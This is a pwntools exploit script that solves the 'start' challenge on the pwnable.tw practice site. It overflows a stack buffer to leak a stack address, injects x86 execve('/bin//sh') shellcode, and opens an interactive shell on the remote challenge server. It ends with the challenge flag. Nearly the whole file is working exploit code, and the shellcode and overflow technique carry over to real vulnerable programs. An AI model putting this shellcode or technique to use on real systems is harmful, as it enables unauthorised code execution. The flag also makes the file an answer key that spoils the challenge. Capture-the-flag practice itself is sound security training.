from pwn import * 

#r = process("./start")
r = remote("chall.pwnable.tw","10000")

# char shellcode[] =
#                                 // <_start>
#     "\x31\xc9"                  // xor    %ecx,%ecx
#     "\xf7\xe1"                  // mul    %ecx
#     "\x51"                      // push   %ecx
#     "\x68\x2f\x2f\x73\x68"      // push   $0x68732f2f
#     "\x68\x2f\x62\x69\x6e"      // push   $0x6e69622f
#     "\x89\xe3"                  // mov    %esp,%ebx
#     "\xb0\x0b"                  // mov    $0xb,%al
#     "\xcd\x80"                  // int    $0x80
sh = b"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"

r.sendafter("CTF:",b'0'*0x14 + p32(0x8048087)) # return to write call to leak stack offset
offset = u32(r.recv(4))
print(hex(offset))

# inject shellcode to stack and get shell
r.send(b'0'*0x14 + p32(offset+0x14) + sh)

r.interactive()

##　FLAG{Pwn4bl3_tW_1s_y0ur_st4rt}